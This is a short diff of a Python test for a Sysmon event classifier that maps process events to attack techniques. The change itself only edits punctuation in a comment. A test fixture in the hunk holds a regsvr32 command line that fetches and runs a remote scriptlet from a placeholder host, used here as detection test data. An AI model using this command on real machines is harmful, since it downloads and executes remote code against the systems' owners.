@@ -137,7 +137,7 @@ def main() -> int:
         got = _techniques(classify_sysmon(1, ev.get("data", {})))
         c.check(f"{label} -> {expect} (got '{got or 'None'}')", expect in got)
 
-    # [2] The command line — the field the whole IOA layer keys off — survives.
+    # [2] The command line - the field the whole IOA layer keys off - survives.
     data = parse_event_xml(_eid1_xml(
         r"C:\Windows\System32\regsvr32.exe",
         r"regsvr32.exe /i:http://x/y.sct scrobj.dll")).get("data", {})
